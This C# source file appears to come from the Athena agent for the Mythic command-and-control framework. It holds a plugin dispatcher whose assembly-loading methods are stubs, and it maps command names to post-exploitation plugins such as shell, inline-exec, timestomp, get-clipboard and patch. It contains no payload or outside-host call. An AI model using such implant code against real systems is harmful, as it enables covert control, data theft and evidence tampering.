using Athena.Commands.Model;
using Athena.Models.Mythic.Tasks;
using System.Collections.Concurrent;
using System.Runtime.Loader;
using Athena.Plugins;
using System.Text.Json;
using Plugins;
using System.Data.Common;
using System.Runtime.CompilerServices;
using Plugin.Plugins;
using System.Text.Json.Serialization;
using System.ComponentModel;
using System.Collections.Specialized;
using System.Text.Json.Nodes;
using System.Linq;

namespace Athena.Commands
{
    internal class PluginParams
    {
        public Dictionary<string, string> parameters { get; set; } = new();
    }
    [JsonSerializable(typeof(PluginParams))]
    [JsonSerializable(typeof(string))]
    internal partial class PluginParamsJsonContext : JsonSerializerContext
    {
    }


    public class AssemblyHandler
    {
        private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
        public bool assemblyIsRunning = false;
        public AssemblyHandler()
        {
            this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
        }
        /// <summary>
        /// Load an assembly into our execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadAssemblyAsync(MythicJob job)
        {
            return new ResponseResult
            {
                task_id = job.task.id,
                user_output = "Cannot load!",
                completed = "true"
            }.ToJson();
        }
        /// <summary>
        /// Execute an operator provided assembly with arguments
        /// </summary>
        /// <param name="job">MythicJob containing the assembly with arguments</param>
        public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
        {
            return new ResponseResult()
            {
                completed = "true",
                user_output = "Cannot execute!",
                task_id = job.task.id,
            }.ToJson();
        }
        /// <summary>
        /// Get output from the currently running assembly
        /// </summary>
        public async Task<string> GetAssemblyOutput()
        {
            return "";
        }
        /// <summary>
        /// Clear the execution context of any loaded assemblies
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> ClearAssemblyLoadContext(MythicJob job)
        {
            return new ResponseResult
            {
                task_id = job.task.id,
                completed = "true",
                user_output = "Can't clear!"
            }.ToJson();
        }
        /// <summary>
        /// Load a command into the command execution context
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> LoadCommandAsync(MythicJob job)
        {
            return new LoadCommandResponseResult
            {
                task_id = job.task.id,
                completed = "true",
                user_output = "Can't load!",
                status = "error"
            }.ToJson();
        }
        public async Task<string> UnloadCommands(MythicJob job)
        {
            return new LoadCommandResponseResult()
            {
                completed = "true",
                user_output = "Can't unload!",
                task_id = job.task.id,
                status = "error"
            }.ToJson();
        }
        
        /// <summary>
        /// Run a previously loaded command
        /// </summary>
        /// <param name="job">MythicJob containing the assembly</param>
        public async Task<string> RunLoadedCommand(MythicJob job)
        {
            try
            {
                //Workaround due to https://stackoverflow.com/questions/59198417/deserialization-of-reference-types-without-parameterless-constructor-is-not-supp
                //job.task.parameters = job.task.parameters.Replace("null", "\"\"");
                Dictionary<string, string> parameters = new();
                
                if (String.IsNullOrEmpty(job.task.parameters))
                {
                    parameters = new Dictionary<string,string>();
                }
                else
                {
                    JsonDocument jdoc = JsonDocument.Parse(job.task.parameters);
                    
                    foreach(var node in jdoc.RootElement.EnumerateObject())
                    {
                        parameters.Add(node.Name, node.Value.ToString() ?? "");
                    }
                }
                parameters.Add("task-id", job.task.id);
                this.loadedPlugins[job.task.command].Execute(parameters);
                Console.WriteLine("Done.");
                return null;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return new ResponseResult()
                {
                    user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
                    completed = "true",
                    status = "error",
                    task_id = job.task.id,
                }.ToJson();
            }
        }
        /// <summary>
        /// Check to see if a command is already loaded
        /// </summary>
        /// <param name="command">Event Sender</param>
        public async Task<bool> IsCommandLoaded(string command)
        {
            IPlugin plugin;
            switch (command)
            {
                case "arp":
                    plugin = new Arp();
                    break;
                case "cat":
                    plugin = new Cat();
                    break;
                case "cd":
                    plugin = new Cd();
                    break;
                case "cp":
                    plugin = new Cp();
                    break;
                case "crop":
                    plugin = new CropPlugin();
                    break;
                case "drives":
                    plugin = new Drives();
                    break;
                //case "ds":
                //    plugin = new Ds();
                //    break;
                case "env":
                    plugin = new Env();
                    break;
                case "farmer":
                    plugin = new Farmer();
                    break;
                case "get-clipboard":
                    plugin = new GetClipboard();
                    break;
                case "get-sessions":
                    plugin = new GetSessions();
                    break;
                case "get-shares":
                    plugin = new GetShares();
                    break;
                case "hostname":
                    plugin = new HostName();
                    break;
                case "ifconfig":
                    plugin = new IfConfig();
                    break;
                case "inline-exec":
                    plugin = new InlineExec();
                    break;
                case "kill":
                    plugin = new Kill();
                    break;
                case "ls":
                    plugin = new Ls();
                    break;
                case "mkdir":
                    plugin = new Mkdir();
                    break;
                case "mv":
                    plugin = new Mv();
                    break;
                case "nslookup":
                    plugin = new Nslookup();
                    break;
                case "patch":
                    plugin = new Patch();
                    break;
                case "ps":
                    plugin = new Ps();
                    break;
                case "pwd":
                    plugin = new Pwd();
                    break;
                case "reg":
                    plugin = new Reg();
                    break;
                case "rm":
                    plugin = new Rm();
                    break;
                case "sftp":
                    plugin = new Sftp();
                    break;
                case "shell":
                    plugin = new Shell();
                    break;
                case "ssh":
                    plugin = new Ssh();
                    break;
                case "tail":
                    plugin = new Tail();
                    break;
                case "test-port":
                    plugin = new TestPort();
                    break;
                case "timestomp":
                    plugin = new TimeStomp();
                    break;
                case "uptime":
                    plugin = new Uptime();
                    break;
                case "whoami":
                    plugin = new WhoAmI();
                    break;
                case "win-enum-resources":
                    plugin = new WinEnumResources();
                    break;
                default:
                    Console.WriteLine("Command is not loaded.");
                    return false;
            }
            Console.WriteLine("Command is loaded.");
            return loadedPlugins.TryAdd(command, plugin);
        }
    }
}
